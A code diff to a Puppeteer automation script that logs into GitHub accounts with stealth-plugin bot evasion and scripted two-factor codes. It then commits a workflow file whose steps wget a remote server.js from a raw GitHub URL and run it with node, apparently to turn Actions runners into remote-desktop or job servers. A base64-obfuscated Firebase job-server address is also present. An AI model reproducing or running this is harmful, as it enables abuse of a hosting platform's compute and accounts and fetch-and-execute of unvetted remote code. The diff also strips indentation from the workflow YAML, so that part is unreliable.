@@ -2,7 +2,6 @@ const StealthPlugin = require('puppeteer-extra-plugin-stealth')
 const puppeteer = require('puppeteer-extra')
 const gmailApi = require('./gmail-api')
 const twofactor = require('node-2fa')
-const proc = require('copy-paste')
 const axios = require('axios')
 
 let browser = null
@@ -17,13 +16,13 @@ let TOKEN = null
 let RDP = "name: CI\n" +
 "on: [push, workflow_dispatch]\n" +
 "jobs:\n" +
-"  build:\n" +
-"    runs-on: ubuntu-latest\n" +
-"    steps:\n" +
+"build:\n" +
+"runs-on: ubuntu-latest\n" +
+"steps:\n" +
 "\n" +
-"    - name: Server\n" +
-"      run: wget https://raw.githubusercontent.com/raiyan088/public/main/github/server.js\n" +
-"    - run: node server.js"
+"- name: Server\n" +
+"- run: wget https://raw.githubusercontent.com/raiyan088/public/main/github/server.js\n" +
+"- run: node server.js\n"
 
 
 let BASE_URL = Buffer.from('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==', 'base64').toString('ascii')
@@ -33,9 +32,7 @@ puppeteer.use(StealthPlugin())
 const GR = new gmailApi()
 
 
-proc.copy(RDP, function () {
-    readData()
-})
+readData()
 
 
 async function readData() {
@@ -180,9 +177,7 @@ async function addRdpCode() {
     await page.goto('https://github.com/'+USER+'/'+USER+'/new/main?filename=.github%2Fworkflows%2Fmain.yml&workflow_template=blank', { waitUntil: 'load', timeout: 0 })
     
     await delay(3000)
-    await page.keyboard.down('Control')
-    await page.keyboard.press('v')
-    await page.keyboard.up('Control')
+    await page.keyboard.type(RDP)
     await delay(1000)
     await page.keyboard.down('Control')
     await page.keyboard.press('s')
